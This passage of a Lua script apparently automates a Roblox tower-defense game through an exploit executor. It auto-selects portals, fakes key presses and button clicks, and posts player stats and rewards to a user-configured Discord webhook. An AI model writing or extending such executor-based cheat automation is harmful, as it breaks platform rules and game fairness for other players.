        end
        
        return bestTierPortals[1].id
    end
    
    local tierFiltered = {}
    for _, portal in ipairs(matchingPortals) do
        if portal.tier == targetTier then
            table.insert(tierFiltered, portal)
        end
    end
    
    if #tierFiltered == 0 then
        return matchingPortals[1].id
    end
    
    for priority = 1, 6 do
        for challengeName, priorityNum in pairs(priorities) do
            if priorityNum == priority and priorityNum > 0 then
                for _, portal in ipairs(tierFiltered) do
                    if portal.challenge == challengeName then
                        return portal.id
                    end
                end
            end
        end
    end
    
    return tierFiltered[1].id
end

local function activatePortalAndStart(portalID)
    if not portalID then 
        return false 
    end
        
    local success, err = pcall(function()
        local remotes = RS:FindFirstChild("Remotes")
        if not remotes then
            return false
        end
        
        local portalsFolder = remotes:FindFirstChild("Portals")
        if not portalsFolder then
            for _, child in ipairs(remotes:GetChildren()) do
                print("  - " .. child.Name .. " (" .. child.ClassName .. ")")
            end
            return false
        end
        
        local activateEvent = portalsFolder:FindFirstChild("Activate")
        if not activateEvent then
            return false
        end
        
        local result = activateEvent:InvokeServer(portalID)
        
        task.wait(0.5)
        
        local startEvent = portalsFolder:FindFirstChild("Start")
        if startEvent then
            startEvent:FireServer()
            return true
        else
            return true
        end
    end)
    
    if not success then
        print("[Portal] ❌ Error activating portal:", err)
    end
    
    return success
end

local function fastSelectPortal()    
    local ok, result = pcall(function()
        if not LocalPlayer or not LocalPlayer.PlayerGui then
            return false
        end
        
        local prompt = LocalPlayer.PlayerGui:FindFirstChild("Prompt")
        if not prompt then 
            return false 
        end
        
        local frame1 = prompt:FindFirstChild("Frame")
        if not frame1 then 
            return false 
        end
        
        local frame2 = frame1:FindFirstChild("Frame")
        if not frame2 then 
            return false 
        end
        
        local children = frame2:GetChildren()
        if #children < 4 then
            return false
        end
        
        local fourthChild = children[4]
        if not fourthChild then
            return false
        end
        
        local subChildren = fourthChild:GetChildren()
        if #subChildren < 2 then
            return false
        end
        
        local secondSubChild = subChildren[2]
        if not secondSubChild then
            return false
        end
        
        local portalButton = secondSubChild:FindFirstChild("TextButton")
        if not portalButton then
            return false
        end
        
        local GuiService = game:GetService("GuiService")
        local VIM = game:GetService("VirtualInputManager")
        
        pcall(function()
            GuiService.SelectedObject = nil
        end)
        task.wait(0.1)
        
        if portalButton and portalButton:IsDescendantOf(LocalPlayer.PlayerGui) then
            pcall(function()
                GuiService.SelectedObject = portalButton
            end)
        else
            return false
        end
        
        local lockConnection
        lockConnection = RunService.Heartbeat:Connect(function()
            pcall(function()
                if portalButton and portalButton:IsDescendantOf(LocalPlayer.PlayerGui) and GuiService.SelectedObject ~= portalButton then
                    GuiService.SelectedObject = portalButton
                end
            end)
        end)
        
        task.wait(0.2)
        
        if GuiService.SelectedObject == portalButton then
            VIM:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
            task.wait(0.02)
            VIM:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
            
            task.wait(0.3)
            
            if lockConnection then
                lockConnection:Disconnect()
            end
            
            GuiService.SelectedObject = nil
        else
            if lockConnection then
                lockConnection:Disconnect()
            end
            return false
        end
        
        task.wait(0.2)
        
        local confirmButton = nil
        
        local frame1 = prompt:FindFirstChild("Frame")
        if frame1 then
            local frame2 = frame1:FindFirstChild("Frame")
            if frame2 then
                local children = frame2:GetChildren()
                if #children >= 5 then
                    local fifthChild = children[5]
                    confirmButton = fifthChild:FindFirstChild("TextButton")
                end
            end
        end
        
        if confirmButton then
            pcall(function()
                GuiService.SelectedObject = nil
            end)
            task.wait(0.05)
            
            if confirmButton:IsDescendantOf(LocalPlayer.PlayerGui) then
                pcall(function()
                    GuiService.SelectedObject = confirmButton
                end)
            else
                return false
            end
            
            local confirmLock
            confirmLock = RunService.Heartbeat:Connect(function()
                pcall(function()
                    if confirmButton and confirmButton:IsDescendantOf(LocalPlayer.PlayerGui) and GuiService.SelectedObject ~= confirmButton then
                        GuiService.SelectedObject = confirmButton
                    end
                end)
            end)
            
            task.wait(0.2)
            
            if GuiService.SelectedObject == confirmButton then
                for i = 1, 3 do
                    VIM:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
                    task.wait(0.02)
                    VIM:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
                    task.wait(0.02)
                end
                
                task.wait(0.1)
                
                if confirmLock then
                    confirmLock:Disconnect()
                end
                
                GuiService.SelectedObject = nil
                return true
            else
                if confirmLock then
                    confirmLock:Disconnect()
                end
                return false
            end
        else
            return false
        end
    end)
    
    if not ok then
        warn("[Portal Reward] Error:", result)
    end
    
    return ok and result
end

task.spawn(function()
    local lastProcessedTime = 0
    local isProcessing = false
    
    while true do
        task.wait(0.5)
        
        if getgenv().PortalConfig.autoPickReward and not isProcessing then
            local success, err = pcall(function()
                local promptUI = LocalPlayer.PlayerGui:FindFirstChild("Prompt")
                if not promptUI then return end
                
                local frame = promptUI:FindFirstChild("Frame")
                if not frame or not frame:FindFirstChild("Frame") then return end
                
                local children = frame.Frame:GetChildren()
                local hasPortalButtons = false
                
                for _, child in ipairs(children) do
                    if child:IsA("Frame") then
                        for _, descendant in ipairs(child:GetDescendants()) do
                            if descendant:IsA("TextButton") and descendant.Name == "TextButton" then
                                hasPortalButtons = true
                                break
                            end
                        end
                        if hasPortalButtons then break end
                    end
                end
                
                if hasPortalButtons then
                    local now = tick()
                    if now - lastProcessedTime > 10 then
                        isProcessing = true
                        lastProcessedTime = now
                        task.wait(1)
                        
                        local selectSuccess, selectResult = pcall(function()
                            return fastSelectPortal()
                        end)
                        
                        if not selectSuccess then
                            warn("[Portal Reward] fastSelectPortal failed: " .. tostring(selectResult))
                            isProcessing = false
                            return
                        end
                        
                        local success = selectResult
                        
                        if success then
                            task.wait(2)
                            for i = 1, 10 do
                                if not LocalPlayer.PlayerGui:FindFirstChild("Prompt") then
                                    break
                                end
                                task.wait(0.5)
                            end
                        end
                        
                        isProcessing = false
                    end
                end
            end)
            
            if not success then
                warn("[Portal Reward] Error in detection loop:", err)
                isProcessing = false
            end
        end
    end
end)

task.spawn(function()
    local lastActivationTime = 0
    
    while true do
        task.wait(2)
        
        local shouldActivate = (getgenv().PortalConfig.useBestPortal == true) or 
                               (getgenv().PortalConfig.useSelectedTier == true)
        
        if shouldActivate then
            local currentlyInLobby = false
            pcall(function()
                local lobbyCheck = workspace:FindFirstChild("Lobby")
                currentlyInLobby = lobbyCheck ~= nil
            end)
            
            local canActivate = false
            
            if currentlyInLobby then
                canActivate = true
            else
                local endGameUI = LocalPlayer.PlayerGui:FindFirstChild("EndGameUI")
                if endGameUI then
                    local gameHasEnded = false
                    if endGameUI:FindFirstChild("Frame") then
                        gameHasEnded = endGameUI.Frame.Visible
                    elseif endGameUI:FindFirstChild("BG") then
                        gameHasEnded = endGameUI.BG.Visible
                    else
                        gameHasEnded = endGameUI.Enabled
                    end
                    canActivate = gameHasEnded
                end
            end
            
            if canActivate then
                local promptExists = LocalPlayer.PlayerGui:FindFirstChild("Prompt") ~= nil
                
                if not promptExists then
                    local now = tick()
                    
                    if now - lastActivationTime > 10 then
                        pcall(function()
                            local portalID = findBestPortalFromClientData()
                            if portalID then
                                local success = activatePortalAndStart(portalID)
                                if success then
                                    lastActivationTime = now
                                end
                            end
                        end)
                    end
                end
            end
        end
    end
end)

if isInLobby then
    task.spawn(function()
        while true do
            task.wait(2)
        end
    end)
end

task.spawn(function()
    while true do
        task.wait(1)
        
        pcall(function()
            local gamemode = RS:FindFirstChild("Gamemode")
            if gamemode and gamemode.Value == "Portal" then
                if getgenv().AutoNextEnabled or getgenv().AutoSmartEnabled then
                    local endGameUI = LocalPlayer.PlayerGui:FindFirstChild("EndGameUI")
                    if endGameUI and endGameUI:FindFirstChild("BG") then
                        local buttons = endGameUI.BG:FindFirstChild("Buttons")
                        if buttons then
                            local nextButton = buttons:FindFirstChild("Next")
                            if nextButton and nextButton:FindFirstChild("Styling") then
                                local label = nextButton.Styling:FindFirstChild("Label")
                                if label and label.Text == "View Portals" then
                                    getgenv()._SkipRecordingNextCall = true
                                    for i, v in pairs(getconnections(nextButton.MouseButton1Click)) do
                                        v:Fire()
                                    end
                                    getgenv()._SkipRecordingNextCall = false
                                    
                                    task.wait(1)
                                    
                                    if getgenv().PortalConfig.pickPortal then
                                        pcall(function()
                                            local promptUI = LocalPlayer.PlayerGui:FindFirstChild("Prompt")
                                            if promptUI and promptUI:FindFirstChild("Frame") then
                                                local frame = promptUI.Frame:FindFirstChild("Frame")
                                                if frame then
                                                    local children = frame:GetChildren()
                                                    for _, child in ipairs(children) do
                                                        if child:IsA("Frame") or child:IsA("GuiObject") then
                                                            local textButton = child:FindFirstChildOfClass("TextButton", true)
                                                            if textButton then
                                                                getgenv()._SkipRecordingNextCall = true
                                                                for i, v in pairs(getconnections(textButton.MouseButton1Click)) do
                                                                    v:Fire()
                                                                end
                                                                getgenv()._SkipRecordingNextCall = false
                                                                task.wait(0.2)
                                                                
                                                                local confirmButton = promptUI:FindFirstChild("Confirm", true)
                                                                if confirmButton and confirmButton:IsA("TextButton") then
                                                                    getgenv()._SkipRecordingNextCall = true
                                                                    for i, v in pairs(getconnections(confirmButton.MouseButton1Click)) do
                                                                        v:Fire()
                                                                    end
                                                                    getgenv()._SkipRecordingNextCall = false
                                                                end
                                                                break
                                                            end
                                                        end
                                                    end
                                                end
                                            end
                                        end)
                                    else
                                        local portalID = findBestPortal()
                                        if portalID then
                                            activatePortal(portalID)
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end)
    end
    end)
end


local function formatNumber(num)
    if not num then return "0" end
    num = math.floor(num + 0.5)
    local s = tostring(num)
    s = s:reverse():gsub("(%d%d%d)", "%1,"):reverse()
    if s:sub(1,1) == "," then s = s:sub(2) end
    return s
end

getgenv()._FormatNumber = formatNumber

local function SendMessageEMBED(url, embed, content)
    if not url or url == "" then
        warn("[Webhook] Invalid URL provided")
        return false
    end
    
    local completed = false
    local result = false
    
    task.spawn(function()
        local success, err = pcall(function()
            local headers = { ["Content-Type"] = "application/json" }
            local data = { 
                embeds = { { 
                    title = embed.title, 
                    description = embed.description, 
                    color = embed.color, 
                    fields = embed.fields, 
                    footer = embed.footer, 
                    timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z") 
                } } 
            }
            
            if content and content ~= "" then
                data.content = content
            end
            
            local httpSvc = game:GetService("HttpService")
            if not httpSvc then
                warn("[Webhook] HttpService not available")
                completed = true
                return
            end
            
            local body = nil
            local encodeSuccess, encodeError = pcall(function()
                body = httpSvc:JSONEncode(data)
            end)
            
            if not encodeSuccess then
                warn("[Webhook] JSON encode failed: " .. tostring(encodeError))
                warn("[Webhook] Data being encoded: " .. tostring(data))
                completed = true
                return
            end
            
            if not body then
                warn("[Webhook] JSON encode returned nil")
                completed = true
                return
            end
            
            print("[Webhook] Request body size: " .. #body .. " bytes")
            
            local requestFunc = syn and syn.request or http_request or request
            if not requestFunc then
                warn("[Webhook] No request function available")
                completed = true
                return
            end
            
            local response = nil
            local requestSuccess, requestResult = pcall(function()
                return requestFunc({
                    Url = url,
                    Method = "POST",
                    Headers = headers,
                    Body = body
                })
            end)
            
            if requestSuccess and requestResult then
                response = requestResult
                if response and response.StatusCode then
                    if response.StatusCode == 204 or response.StatusCode == 200 then
                        result = true
                    else
                        local errorBody = ""
                        if response.Body then
                            errorBody = response.Body
                        end
                        warn("[Webhook] Failed with status: " .. response.StatusCode)
                        if errorBody and errorBody ~= "" then
                            warn("[Webhook] Error response: " .. tostring(errorBody))
                        end
                    end
                else
                    result = true
                end
            else
                warn("[Webhook] Request failed: " .. tostring(requestResult))
            end
            
            completed = true
        end)
        
        if not success then
            warn("[Webhook] Error: " .. tostring(err))
            completed = true
        end
    end)
    
    local timeout = 8
    local waited = 0
    while not completed and waited < timeout do
        task.wait(0.1)
        waited = waited + 0.1
    end
    
    if not completed then
        warn("[Webhook] Request timed out after " .. timeout .. "s")
        return false
    end
    
    return result
end

getgenv()._CompareCapsuleRewards = function(beforeData, afterData)
    if not beforeData or not afterData then return "" end
    
    local rewards = {}
    
    if afterData.UnitData and beforeData.UnitData then
        local unitCounts = {}
        for unitID, unitInfo in pairs(afterData.UnitData) do
            if not beforeData.UnitData[unitID] and unitInfo.UnitName then
                local unitName = unitInfo.UnitName
                unitCounts[unitName] = (unitCounts[unitName] or 0) + 1
            end
        end
        
        for unitName, count in pairs(unitCounts) do
            table.insert(rewards, count .. "x " .. unitName)
        end
    end
    
    if afterData.ItemData and beforeData.ItemData then
        for itemName, itemInfo in pairs(afterData.ItemData) do
            local beforeAmount = (beforeData.ItemData[itemName] and beforeData.ItemData[itemName].Amount) or 0
            local afterAmount = itemInfo.Amount or 0
            local gained = afterAmount - beforeAmount
            
            if gained > 0 then
                local displayName = itemName:gsub("([A-Z])", " %1"):gsub("^%s+", "")
                table.insert(rewards, "+" .. formatNumber(gained) .. " " .. displayName)
            end
        end
    elseif afterData.ItemData then
        for itemName, itemInfo in pairs(afterData.ItemData) do
            local amount = itemInfo.Amount or 0
            if amount > 0 then
                local displayName = itemName:gsub("([A-Z])", " %1"):gsub("^%s+", "")
                table.insert(rewards, "+" .. formatNumber(amount) .. " " .. displayName)
            end
        end
    end
    
    if #rewards == 0 then
        return "No new items"
    end
    
    return table.concat(rewards, "\n")
end

getgenv()._CapsuleWebhookDebounce = getgenv()._CapsuleWebhookDebounce or {}

getgenv()._SendCapsuleWebhook = function(eventName, capsuleCount, rewardsText, clientData)
    if not getgenv().WebhookEnabled or not getgenv().WebhookURL or getgenv().WebhookURL == "" then
        return
    end
    
    if not clientData then 
        return 
    end
    
    local debounceKey = eventName .. "_" .. capsuleCount .. "_" .. tick()
    local lastSendTime = getgenv()._CapsuleWebhookDebounce[eventName] or 0
    local currentTime = tick()
    
    if currentTime - lastSendTime < 5 then
        return
    end
    
    getgenv()._CapsuleWebhookDebounce[eventName] = currentTime
    
    local username = LocalPlayer.Name
    local level = clientData.Level or 0
    local exp = clientData.EXP or 0
    local expNeeded = clientData.EXPNeeded or 0
    
    local function formatStats()
        local stats = "<:gold:1265957290251522089> " .. formatNumber(clientData.Jewels or 0)
        stats = stats .. "\n<:jewel:1217525743408648253> " .. formatNumber(clientData.Gold or 0)
        stats = stats .. "\n<:emerald:1389165843966984192> " .. formatNumber(clientData.Emeralds or 0)
        stats = stats .. "\n<:rerollshard:1426315987019501598> " .. formatNumber(clientData.Rerolls or 0)
        stats = stats .. "\n<:candybasket:1426304615284084827> " .. formatNumber(clientData.CandyBasket or 0)
        
        local bingoStamps = 0
        if clientData.ItemData and clientData.ItemData.HallowenBingoStamp then
            bingoStamps = clientData.ItemData.HallowenBingoStamp.Amount or 0
        end
        stats = stats .. "\n<:bingostamp:1426362482141954068> " .. formatNumber(bingoStamps)
        
        stats = stats .. "\n<:halloweencookies:1430910916534210580> " .. formatNumber(clientData.HalloweenCookies or 0)
        
        stats = stats .. "\n<:slimecoins:1430922724230037684> " .. formatNumber(clientData.MagicCoins or 0)
        
        return stats
    end
    
    local embedFields = {
        { name = "Player Stats", value = formatStats(), inline = true },
        { name = "Capsule Rewards", value = rewardsText ~= "" and rewardsText or "No rewards", inline = true }
    }
    
    local embed = {
        title = eventName,
        description = string.format("**Username:** ||%s||\n**Level:** %d [%s/%s]", 
            username, 
            level, 
            formatNumber(exp), 
            formatNumber(expNeeded)
        ),
        color = 0x9B59B6,
        fields = embedFields,
        footer = { text = "Capsules Opened: " .. formatNumber(capsuleCount) }
    }
    
    local pingContent = ""
    if getgenv().PingOnSecretDrop and getgenv().DiscordUserID and getgenv().DiscordUserID ~= "" then
        pingContent = "<@" .. getgenv().DiscordUserID .. ">"
    end
    
    task.spawn(function()
        SendMessageEMBED(getgenv().WebhookURL, embed, pingContent)
    end)
end

local function getRewards()
    local rewards = {}
    local ok, res = pcall(function()
        local ui = LocalPlayer.PlayerGui:FindFirstChild("EndGameUI")
        if not ui then return {} end
        local holder = ui:FindFirstChild("BG") and ui.BG:FindFirstChild("Container") and ui.BG.Container:FindFirstChild("Rewards") and ui.BG.Container.Rewards:FindFirstChild("Holder")
        if not holder then return {} end
        
        local waitTime = 0
        local lastCount = 0
        local stableCount = 0
        repeat
            task.wait(0.3)
            waitTime = waitTime + 0.3
            local children = holder:GetChildren()
            local currentCount = 0
            for i = 1, #children do
                if children[i]:IsA("TextButton") then
                    currentCount = currentCount + 1
                end
            end
            if currentCount == lastCount and currentCount > 0 then
                stableCount = stableCount + 1
            else
                stableCount = 0
            end
            lastCount = currentCount
        until (stableCount >= 5 and currentCount > 0) or waitTime > 4
        
        for _, item in pairs(holder:GetChildren()) do
            if item:IsA("TextButton") then
                local rewardName, rewardAmount
                local unitName = item:FindFirstChild("UnitName")
                if unitName and unitName.Text and unitName.Text ~= "" then
                    rewardName = unitName.Text
                end
                local itemName = item:FindFirstChild("ItemName")
                if itemName and itemName.Text and itemName.Text ~= "" then
                    rewardName = itemName.Text
                end
                if rewardName then
                    local amountLabel = item:FindFirstChild("Amount")
                    if amountLabel and amountLabel.Text then
                        local amountText = amountLabel.Text
                        local clean = string.gsub(string.gsub(string.gsub(amountText, "x", ""), "+", ""), ",", "")
                        rewardAmount = tonumber(clean)
                    else
                        rewardAmount = 1
                    end
                    if rewardAmount then
                        table.insert(rewards, { name = rewardName, amount = rewardAmount })
                    end
                end
            end
        end
        return rewards
    end)
    return ok and res or {}
end

getgenv()._GetMatchResult = function()
    local ok, time, wave, result = pcall(function()
        local ui = LocalPlayer.PlayerGui:FindFirstChild("EndGameUI")
        if not ui then return "00:00:00", "0", "Unknown" end
        local stats = ui:FindFirstChild("BG") and ui.BG:FindFirstChild("Container") and ui.BG.Container:FindFirstChild("Stats")
        if not stats then return "00:00:00", "0", "Unknown" end
        
        local r = (stats:FindFirstChild("Result") and stats.Result.Text) or "Unknown"
        local w = (stats:FindFirstChild("EndWave") and stats.EndWave.Text) or "0"
        
        local t = "00:00:00"
        pcall(function()
            local elapsed = RS:FindFirstChild("ElapsedTime")
            if elapsed and elapsed.Value then
                local roundTime = elapsed.Value - (getgenv()._RoundStartTime or 0)
                if roundTime < 0 then roundTime = elapsed.Value end
                
                local timeScale = 1
                pcall(function()
                    local timeScaleValue = RS:FindFirstChild("TimeScale")
                    if timeScaleValue and timeScaleValue:IsA("NumberValue") then
                        timeScale = timeScaleValue.Value or 1
                    end
                end)
                
                local realTime = roundTime / timeScale
                
                local seconds = math.floor(realTime)
                local hours = math.floor(seconds / 3600)
                local minutes = math.floor((seconds % 3600) / 60)
                local secs = seconds % 60
                t = string.format("%02d:%02d:%02d", hours, minutes, secs)
            end
        end)
        
        if w:find("Wave Reached:") then
            local wm = w:match("Wave Reached:%s*(%d+)")
            if wm then w = wm end
        end
        
        if r:lower():find("win") or r:lower():find("victory") then
            r = "VICTORY"
        elseif r:lower():find("defeat") or r:lower():find("lose") or r:lower():find("loss") then
            r = "DEFEAT"
        end
        
        return t, w, r
    end)
    if ok then return time, wave, result else return "00:00:00", "0", "Unknown" end
end

getgenv()._GetMapInfo = function()
    local ok, name, difficulty = pcall(function()
        local map = workspace:FindFirstChild("Map")
        if not map then return "Unknown Map", "Unknown" end
        local mapName = map:FindFirstChild("MapName")
        local mapDifficulty = map:FindFirstChild("MapDifficulty")
        return mapName and mapName.Value or "Unknown Map", mapDifficulty and mapDifficulty.Value or "Unknown"
    end)
    if ok then return name, difficulty else return "Unknown Map", "Unknown" end
end


do
    if not getgenv()._WebhookInitialData then
        getgenv()._WebhookInitialData = {
            Jewels = 0,
            Gold = 0,
            Emeralds = 0,
            Rerolls = 0,
            CandyBasket = 0,
            HeroTokens = 0,
            EXP = 0,
            ItemData = {},
            ExperienceItemsData = {},
            UnitCounts = {}
        }
    end
    
    if not getgenv()._RoundStartTime then
        getgenv()._RoundStartTime = 0
        task.spawn(function()
            task.wait(2)
            
            pcall(function()
                local elapsed = RS:FindFirstChild("ElapsedTime")
                if elapsed and elapsed.Value then
                    getgenv()._RoundStartTime = elapsed.Value
                end
            end)
            
            local clientData = getClientData()
            if clientData then
                getgenv()._WebhookInitialData.Jewels = clientData.Jewels or 0
                getgenv()._WebhookInitialData.Gold = clientData.Gold or 0
                getgenv()._WebhookInitialData.Emeralds = clientData.Emeralds or 0
                getgenv()._WebhookInitialData.Rerolls = clientData.Rerolls or 0
                getgenv()._WebhookInitialData.CandyBasket = clientData.CandyBasket or 0
                getgenv()._WebhookInitialData.HeroTokens = clientData.HeroTokens or 0
                getgenv()._WebhookInitialData.EXP = clientData.EXP or 0
                getgenv()._WebhookInitialData.HalloweenCookies = clientData.HalloweenCookies or 0
                getgenv()._WebhookInitialData.MagicCoins = clientData.MagicCoins or 0
                getgenv()._WebhookInitialData.EmberTokens = clientData.EmberTokens or 0
                getgenv()._WebhookInitialData.BlazeTokens = clientData.BlazeTokens or 0
                getgenv()._WebhookInitialData.HorseTokens = clientData.HorseTokens or 0
                getgenv()._WebhookInitialData.DevilDogTokens = clientData.DevilDogTokens or 0
                getgenv()._WebhookInitialData.TitanRushTokens = clientData.TitanRushTokens or 0
                getgenv()._WebhookInitialData.SoccerTokens = clientData.SoccerTokens or 0
                getgenv()._WebhookInitialData.SlimeCoins = clientData.SlimeCoins or 0
                
                getgenv()._WebhookInitialData.ItemData = {}
                if clientData.ItemData then
                    for itemName, itemInfo in pairs(clientData.ItemData) do
                        if itemInfo.Amount then
                            getgenv()._WebhookInitialData.ItemData[itemName] = itemInfo.Amount
                        end
                    end
                end
                
                getgenv()._WebhookInitialData.ExperienceItemsData = {}
                if clientData.ExperienceItemsData then
                    for itemName, itemInfo in pairs(clientData.ExperienceItemsData) do
                        if itemInfo.Amount then
                            getgenv()._WebhookInitialData.ExperienceItemsData[itemName] = itemInfo.Amount
                        end
                    end
                end
                
                getgenv()._WebhookInitialData.UnitCounts = {}
                if clientData.UnitData then
                    for unitID, unitInfo in pairs(clientData.UnitData) do
                        if unitInfo.UnitName then
                            local unitName = unitInfo.UnitName
                            getgenv()._WebhookInitialData.UnitCounts[unitName] = (getgenv()._WebhookInitialData.UnitCounts[unitName] or 0) + 1
                        end
                    end
                end
            end
        end)
    end
    
    if not getgenv()._lastWebhookHash then
        getgenv()._lastWebhookHash = ""
    end
    
    if not getgenv()._lastWebhookTime then
        getgenv()._lastWebhookTime = 0
    end
    
    local WEBHOOK_COOLDOWN = 10
    
    getgenv()._SendWebhookFunction = function()
        if not getgenv().WebhookEnabled then 
            warn("[Webhook] Webhook is disabled, returning early")
            getgenv().WebhookProcessing = false
            return 
        end

        print("[Webhook] Passed all early checks, continuing...")
        
        getgenv()._lastWebhookTime = tick()
        getgenv().WebhookProcessing = true
        
        local webhookStartTime = tick()
        local maxWebhookDuration = 15
        
        local success, err = pcall(function()
            print("[Webhook] Starting webhook send...")
            
            if not getgenv().WebhookURL or getgenv().WebhookURL == "" then
                warn("[Webhook] ❌ Webhook URL is not set!")
                getgenv().WebhookProcessing = false
                return
            end
            
            local isSeamlessRestart = getgenv()._WebhookSeamlessRestart or false
            
            local matchTime = getgenv()._CachedMatchTime
            local matchWave = getgenv()._CachedMatchWave
            local matchResult = getgenv()._CachedMatchResult
            local mapName, mapDifficulty = getgenv()._GetMapInfo()
            
            local currentGamemode = "Unknown"
            pcall(function()
                local gamemode = RS:FindFirstChild("Gamemode")
                if gamemode and gamemode.Value then
                    currentGamemode = tostring(gamemode.Value)
                end
            end)
            
            if getgenv()._CachedGamemode then
                currentGamemode = getgenv()._CachedGamemode
            end
            
            local clientData = getgenv()._WebhookEndGameData or getClientData()
            
            if not clientData then
                warn("[Webhook] ❌ Failed to get client data")
                getgenv().WebhookProcessing = false
                return
            end
            
            if not getgenv()._WebhookInitialData then
                getgenv()._RefreshWebhookInitialData()
            end
            
            if isSeamlessRestart then
                pcall(function()
                    local wave = RS:FindFirstChild("Wave")
                    if wave and wave.Value then
                        matchWave = tostring(wave.Value)
                    end
                    
                    local elapsed = RS:FindFirstChild("ElapsedTime")
                    if elapsed and elapsed.Value then
                        local roundTime = elapsed.Value
                        
                        if getgenv()._RoundStartTime and getgenv()._RoundStartTime > 0 then
                            roundTime = elapsed.Value - getgenv()._RoundStartTime
                            if roundTime < 0 or roundTime > elapsed.Value then
                                roundTime = elapsed.Value
                            end
                        end
                        
                        local timeScale = 1
                        pcall(function()
                            local timeScaleValue = RS:FindFirstChild("TimeScale")
                            if timeScaleValue and timeScaleValue:IsA("NumberValue") then
                                timeScale = timeScaleValue.Value or 1
                            end
                        end)
                        
                        local realTime = roundTime / timeScale
                        
                        local seconds = math.floor(realTime)
                        local hours = math.floor(seconds / 3600)
                        local minutes = math.floor((seconds % 3600) / 60)
                        local secs = seconds % 60
                        matchTime = string.format("%02d:%02d:%02d", hours, minutes, secs)
                    end
                    
                    matchResult = "Seamless Restart"
                end)
            end
            
            if not matchWave or matchWave == "" then
                matchWave = "0"
            end
            
            if matchWave == "0" then
                pcall(function()
                    local wave = RS:FindFirstChild("Wave")
                    if wave and wave.Value and wave.Value > 0 then
                        matchWave = tostring(wave.Value)
                    end
                end)
            end
            
            if not matchResult or matchResult == "Unknown" or matchResult == "" then
                matchResult = "Match Complete"
            end
            
            if not matchTime or matchTime == "00:00:00" or matchTime == "" then
                pcall(function()
                    local elapsed = RS:FindFirstChild("ElapsedTime")
                    if elapsed and elapsed.Value then
                        local roundTime = elapsed.Value
                        
                        if getgenv()._RoundStartTime and getgenv()._RoundStartTime > 0 then
                            roundTime = elapsed.Value - getgenv()._RoundStartTime
                            if roundTime < 0 or roundTime > elapsed.Value then
                                roundTime = elapsed.Value
                            end
                        end
                        
                        local timeScale = 1
                        pcall(function()
                            local timeScaleValue = RS:FindFirstChild("TimeScale")
                            if timeScaleValue and timeScaleValue:IsA("NumberValue") then
                                timeScale = timeScaleValue.Value or 1
                            end
                        end)
                        
                        local realTime = roundTime / timeScale
                        local seconds = math.floor(realTime)
                        local hours = math.floor(seconds / 3600)
                        local minutes = math.floor((seconds % 3600) / 60)
                        local secs = seconds % 60
                        matchTime = string.format("%02d:%02d:%02d", hours, minutes, secs)
                    end
                end)
            end
            
            if not matchTime or matchTime == "00:00:00" or matchTime == "" then
                matchTime = "00:00:00"
            end
            
            
            local function formatStats()
                print("[Webhook Debug] Rerolls raw value:", clientData.Rerolls)
                print("[Webhook Debug] Rerolls type:", type(clientData.Rerolls))
                
                local stats = "<:gold:1265957290251522089> " .. formatNumber(clientData.Jewels or 0)
                stats = stats .. "\n<:jewel:1217525743408648253> " .. formatNumber(clientData.Gold or 0)
                stats = stats .. "\n<:emerald:1389165843966984192> " .. formatNumber(clientData.Emeralds or 0)
                stats = stats .. "\n<:rerollshard:1426315987019501598> " .. formatNumber(clientData.Rerolls or 0)
                stats = stats .. "\n<:candybasket:1426304615284084827> " .. formatNumber(clientData.CandyBasket or 0)
                
                local bingoStamps = 0
                if clientData.ItemData and clientData.ItemData.HallowenBingoStamp then
                    bingoStamps = clientData.ItemData.HallowenBingoStamp.Amount or 0
                end
                stats = stats .. "\n<:bingostamp:1426362482141954068> " .. formatNumber(bingoStamps)
                
                stats = stats .. "\n<:halloweencookies:1430910916534210580> " .. formatNumber(clientData.HalloweenCookies or 0)
                
                stats = stats .. "\n<:slimecoins:1430922724230037684> " .. formatNumber(clientData.MagicCoins or 0)
                
                return stats
            end
            
            local rewardsText = ""
            
            local function getValue(data, key, default)
                if not data then return default or 0 end
                local val = data[key]
                if type(val) == "number" then
                    return val
                elseif type(val) == "string" then
                    return tonumber(val) or default or 0
                end
                return default or 0
            end
            
            local currencyKeys = {
                {key = "Jewels", name = "Jewels"},
                {key = "Gold", name = "Gold"},
                {key = "Emeralds", name = "Emeralds"},
                {key = "Rerolls", name = "Rerolls"},
                {key = "HeroTokens", name = "Hero Coins"},
                {key = "EXP", name = "Player EXP"},
                {key = "CandyBasket", name = "Candy Basket"},
                {key = "HalloweenCookies", name = "Halloween Cookies"},
                {key = "MagicCoins", name = "Slime Coins"},
                {key = "EmberTokens", name = "Ember Tokens"},
                {key = "BlazeTokens", name = "Blaze Tokens"},
                {key = "HorseTokens", name = "Horse Tokens"},
                {key = "DevilDogTokens", name = "Devil Dog Tokens"},
                {key = "TitanRushTokens", name = "Titan Rush Tokens"},
                {key = "SoccerTokens", name = "Soccer Tokens"},
                {key = "SlimeCoins", name = "Slime Coins"},
                {key = "SummerCorals", name = "Summer Corals"},
                {key = "RaidTokens", name = "Raid Tokens"},
                {key = "SoulCoin", name = "Soul Coins"},
                {key = "CandyCanes", name = "Candy Canes"},
                {key = "ChainsawTokens", name = "Chainsaw Tokens"},
                {key = "DivineTokens", name = "Divine Tokens"},
                {key = "GrailRushTokens", name = "Grail Rush Tokens"},
                {key = "PirateBountyTokens", name = "Pirate Bounty Tokens"},
                {key = "BossRushTokens", name = "Boss Rush Tokens"},
                {key = "SoulTokens", name = "Soul Tokens"},
                {key = "FlowerTokens", name = "Flower Tokens"},
                {key = "AlchemyTokens", name = "Alchemy Tokens"},
                {key = "NationalTokens", name = "National Tokens"},
                {key = "SwordsmanOrbs", name = "Swordsman Orbs"},
                {key = "DragonScales", name = "Dragon Scales"},
                {key = "CursedEnergyTokens", name = "Cursed Energy Tokens"},
                {key = "CursedBreachTokens", name = "Cursed Breach Tokens"},
                {key = "VisionaryToken", name = "Visionary Tokens"},
                {key = "BlackChakraRod", name = "Black Chakra Rods"},
                {key = "LuckyTokens", name = "Lucky Tokens"},
                {key = "RevolutionTokens", name = "Revolution Tokens"},
                {key = "ManaRushTokens", name = "Mana Rush Tokens"},
                {key = "SummerPrepTokens", name = "Summer Prep Tokens"},
            }
            
            if getgenv()._WebhookInitialData and getgenv()._WebhookInitialData.Tokens then
                for tokenKey, _ in pairs(getgenv()._WebhookInitialData.Tokens) do
                    local alreadyAdded = false
